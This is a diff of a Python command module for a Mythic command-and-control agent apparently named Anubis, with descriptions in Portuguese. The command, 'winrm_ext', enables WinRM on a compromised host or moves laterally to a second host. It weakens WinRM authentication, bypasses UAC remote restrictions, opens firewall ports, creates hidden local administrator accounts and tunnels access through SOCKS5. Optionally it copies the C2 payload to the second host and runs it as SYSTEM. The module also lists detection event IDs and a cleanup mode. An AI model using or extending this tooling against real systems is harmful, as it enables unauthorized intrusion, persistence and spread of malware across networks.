@@ -1,158 +1,240 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import json
-import os
+
 
 class WinrmExtArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
-
         self.args = [
             CommandParameter(
                 name="remote",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description=(
+                    "IP do HOST-B a configurar via lateral movement a partir do agente. "
+                    "Vazio = self-host."
+                ),
                 default_value="",
-                description="IP do HOST-B a configurar via lateral movement a partir do agente. Vazio = self-host"
             ),
-
             CommandParameter(
                 name="target",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="IP/hostname (self-host). Vazio = IP local do agente.",
                 default_value="",
-                description="IP/hostname (self-host). Vazio = IP local do agente"
             ),
-
             CommandParameter(
                 name="port",
                 type=ParameterType.Number,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Porta WinRM (5986 se ssl=True). Padrão: 5985.",
                 default_value=5985,
-                description="Porta WinRM (5986 se ssl=True)"
             ),
-
             CommandParameter(
                 name="username",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Credencial (admin no alvo, p/ remote).",
                 default_value="",
-                description="Credencial (admin no alvo, p/ remote)"
             ),
-
             CommandParameter(
                 name="password",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Senha.",
                 default_value="",
-                description="Senha"
             ),
-
             CommandParameter(
                 name="domain",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Domínio Windows (ex: CORP). Vazio = conta local.",
                 default_value="",
-                description="Domínio (ex: CORP). Vazio = conta local"
             ),
-
             CommandParameter(
                 name="socks_port",
                 type=ParameterType.Number,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Porta SOCKS5 a abrir no servidor Mythic. Padrão: 7005.",
                 default_value=7005,
-                description="Porta do SOCKS5 no servidor Mythic"
             ),
-
             CommandParameter(
                 name="add_user",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Cria usuário local admin no alvo (self-host ou remote).",
                 default_value="",
-                description="Cria usuário local admin no alvo"
             ),
-
             CommandParameter(
                 name="add_pass",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="Senha do add_user. Vazio = senha aleatória gerada.",
                 default_value="",
-                description="Senha do add_user"
             ),
-
             CommandParameter(
                 name="ssl",
                 type=ParameterType.Boolean,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="HTTPS (5986) — suportado no bootstrap via PSRemoting.",
                 default_value=False,
-                description="HTTPS (5986)"
             ),
-
             CommandParameter(
                 name="action",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description="'cleanup' reverte configurações no alvo (local ou remoto).",
                 default_value="",
-                description="'cleanup' reverte configurações"
             ),
-
             CommandParameter(
                 name="deploy",
                 type=ParameterType.String,
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description=(
+                    "(com remote) caminho do payload do Anubis no HOST-A; "
+                    "copia e executa no HOST-B."
+                ),
                 default_value="",
-                description="Caminho do payload do Anubis no HOST-A"
             ),
         ]
 
     async def parse_arguments(self):
-        if len(self.command_line) > 0:
-            if self.command_line[0] == "{":
-                self.load_args_from_json_string(self.command_line)
+        if self.command_line:
+            if self.command_line.strip().startswith('{'):
+                d = json.loads(self.command_line)
+                self.add_arg("remote",     d.get("remote",     ""))
+                self.add_arg("target",     d.get("target",     ""))
+                self.add_arg("port",       d.get("port",       5985), ParameterType.Number)
+                self.add_arg("username",   d.get("username",   ""))
+                self.add_arg("password",   d.get("password",   ""))
+                self.add_arg("domain",     d.get("domain",     ""))
+                self.add_arg("socks_port", d.get("socks_port", 7005), ParameterType.Number)
+                self.add_arg("add_user",   d.get("add_user",   ""))
+                self.add_arg("add_pass",   d.get("add_pass",   ""))
+                self.add_arg("ssl",        d.get("ssl",        False), ParameterType.Boolean)
+                self.add_arg("action",     d.get("action",     ""))
+                self.add_arg("deploy",     d.get("deploy",     ""))
             else:
-                # estilo posicional: winrm_ext <target> <username> <password> <domain>
-                parts = self.command_line.split()
-                if len(parts) >= 1:
-                    self.set_arg("target", parts[0])
-                if len(parts) >= 2:
-                    self.set_arg("username", parts[1])
-                if len(parts) >= 3:
-                    self.set_arg("password", parts[2])
-                if len(parts) >= 4:
-                    self.set_arg("domain", parts[3])
+                # Posicional: [target] [user] [password] [domain]
+                parts = self.command_line.strip().split()
+                self.add_arg("remote",     "")
+                self.add_arg("target",     parts[0] if len(parts) > 0 else "")
+                self.add_arg("username",   parts[1] if len(parts) > 1 else "")
+                self.add_arg("password",   parts[2] if len(parts) > 2 else "")
+                self.add_arg("domain",     parts[3] if len(parts) > 3 else "")
+                self.add_arg("port",       5985, ParameterType.Number)
+                self.add_arg("socks_port", 7005, ParameterType.Number)
+                self.add_arg("add_user",   "")
+                self.add_arg("add_pass",   "")
+                self.add_arg("ssl",        False, ParameterType.Boolean)
+                self.add_arg("action",     "")
+                self.add_arg("deploy",     "")
         else:
-            raise ValueError("winrm_ext: use winrm_ext <target> <user> <pass> [domain] "
-                             "ou JSON com remote/deploy.")
-
-    async def parse_dictionary(self, dictionary):
-        self.load_args_from_dictionary(dictionary)
+            self.add_arg("remote",     "")
+            self.add_arg("target",     "")
+            self.add_arg("port",       5985, ParameterType.Number)
+            self.add_arg("username",   "")
+            self.add_arg("password",   "")
+            self.add_arg("domain",     "")
+            self.add_arg("socks_port", 7005, ParameterType.Number)
+            self.add_arg("add_user",   "")
+            self.add_arg("add_pass",   "")
+            self.add_arg("ssl",        False, ParameterType.Boolean)
+            self.add_arg("action",     "")
+            self.add_arg("deploy",     "")
 
 
 class WinrmExtCommand(CommandBase):
-    cmd = "winrm_ext"
+    cmd         = "winrm_ext"
     needs_admin = False
-    help_cmd = ("winrm_ext [target] [username] [password] [domain]  |  "
-                "winrm_ext {\"remote\":\"10.0.0.5\",\"username\":\"adm\","
-                "\"password\":\"P@ss\",\"domain\":\"CORP\",\"deploy\":\"C:\\\\tmp\\\\anubis.exe\"}")
-    description = ("Configura WinRM no host local (self-host) ou, com 'remote', "
-                   "configura WinRM em outro host a partir do agente (lateral "
-                   "movement) — opcionalmente implantando o payload do Anubis no alvo. "
-                   "Retorna comandos evil-winrm/netexec via SOCKS5 do Mythic e "
-                   "one-liners PSRemoting para rodar no próprio agente.")
-    version = 2
-    author = "@wtechsec"
-    attackmapping = ["T1021.006", "T1090", "T1562.004", "T1136.001", "T1570"]
-    argument_class = WinrmExtArguments
-    attributes = CommandAttributes(
+    help_cmd    = "winrm_ext [target_ip] [username] [password] [domain]"
+    description = (
+        "Configura e ativa WinRM no host do agente (self-host) ou em outro host "
+        "via lateral movement a partir do agente (remote), com acesso via tunnel "
+        "SOCKS5 (T1021.006/T1090).\n\n"
+        "Self-host (no host do agente):\n"
+        "  1. Auth: WSMAN\\Service\\AllowUnencrypted=1, Auth\\Basic=1\n"
+        "  2. UAC: LocalAccountTokenFilterPolicy=1 (admins locais OK remoto)\n"
+        "  3. Listener: WSMAN\\Listener\\{GUID} HTTP *:<port> (ou HTTPS 5986 c/ ssl)\n"
+        "  4. Serviço WinRM: AutoStart via SCM ctypes\n"
+        "  5. Firewall: netsh advfirewall add rule TCP/<port> inbound\n"
+        "  6. TCP probe → retorna evil-winrm/netexec prontos via SOCKS5\n\n"
+        "Remote (A→B, a partir do agente):\n"
+        "  winrm_ext {\\\"remote\\\":\\\"10.0.0.5\\\",\\\"username\\\":\\\"adm\\\","
+        "\\\"password\\\":\\\"P@ss\\\",\\\"domain\\\":\\\"CORP\\\"}\n"
+        "  Cadeia de bootstrap: PSRemoting → WMI (CIM) → SMB (reg+SCM+schtasks).\n"
+        "  Com \\\"deploy\\\": caminho do payload do Anubis no HOST-A → copia para "
+        "\\\\B\\C$\\Windows\\Temp e executa como SYSTEM (novo callback).\n\n"
+        "Extras:\n"
+        "  add_user/add_pass : cria usuário local em Administrators no alvo\n"
+        "  action='cleanup'  : reverte firewall, listener, registro e usuário\n\n"
+        "Pré-requisito no operador (Kali):\n"
+        "  apt install evil-winrm   # shell interativo WinRM\n"
+        "  pipx install netexec      # nxc winrm (SOCKS5 nativo)\n\n"
+        "Detecção no alvo:\n"
+        "  EID 4624 (Logon Type 3), 4625, 4720/4732 (add_user), 7036 (WinRM restart),\n"
+        "  WinRM Operational 91/142, 4946 (firewall rule added), 4104 (PS script block)"
+    )
+    version               = 1
+    author                = "@wtechsec"
+    attackmapping         = ["T1021.006", "T1090", "T1562.004", "T1136.001", "T1570"]
+    supported_ui_features = []
+    argument_class        = WinrmExtArguments
+    attributes            = CommandAttributes(
         supported_python_versions=["Python 3.8"],
         supported_os=[SupportedOS.Windows],
     )
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
-        remote = task.args.get_arg("remote") or ""
-        deploy = task.args.get_arg("deploy") or ""
-        target = task.args.get_arg("target") or ""
-        if remote:
-            task.display_params = "REMOTO %s:%s → deploy=%s" % (
-                remote, task.args.get_arg("port"),
-                os.path.basename(deploy) if deploy else "-")
-        else:
-            task.display_params = "self-host %s:%s" % (
-                target or "<IP do agente>", task.args.get_arg("port"))
-        return task
+    async def create_go_tasking(
+        self, taskData: PTTaskMessageAllData
+    ) -> PTTaskCreateTaskingMessageResponse:
+        response = PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
 
-    async def process_response(self, response: AgentResponse):
-        resp = await PTTaskProcessResponseMessageResponse(
-            task_id=response.task.id,
-            process_response="standard",
-            response=response.response,
-        ).to_json()
-        return resp
+        remote     = taskData.args.get_arg("remote")     or ""
+        target     = taskData.args.get_arg("target")     or ""
+        port       = taskData.args.get_arg("port")       or 5985
+        socks_port = taskData.args.get_arg("socks_port") or 7005
+        deploy     = taskData.args.get_arg("deploy")     or ""
+
+        # ── Inicia SOCKS5 no servidor Mythic ──────────────────────────────────
+        # "address already in use" = SOCKS5 já está ativo → apenas informa, não bloqueia
+        socks_resp = await SendMythicRPCProxyStartCommand(MythicRPCProxyStartMessage(
+            TaskID=taskData.Task.ID,
+            PortType="socks",
+            LocalPort=socks_port,
+        ))
+        if not socks_resp.Success:
+            already = "already in use" in (socks_resp.Error or "").lower()
+            msg = "[*] SOCKS5 já ativo na porta {} — reutilizando tunnel existente.\n".format(
+                socks_port) if already else \
+                "[!] SOCKS5 aviso: {}\n".format(socks_resp.Error)
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=msg.encode()
+            ))
+
+        # ── display_params ─────────────────────────────────────────────────────
+        user_str = ""
+        domain = taskData.args.get_arg("domain") or ""
+        username = taskData.args.get_arg("username") or ""
+        if domain and username:
+            user_str = " {}\\{}".format(domain, username)
+        elif username:
+            user_str = " {}".format(username)
+
+        if remote:
+            response.DisplayParams = "REMOTO {}{} deploy={}".format(
+                remote, user_str, deploy or "-")
+        else:
+            response.DisplayParams = "self-host {}:{}{}".format(
+                target or "<IP do agente>", port, user_str)
+        return response
+
+    async def process_response(
+        self, task: PTTaskMessageAllData, response: any
+    ) -> PTTaskProcessResponseMessageResponse:
+        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
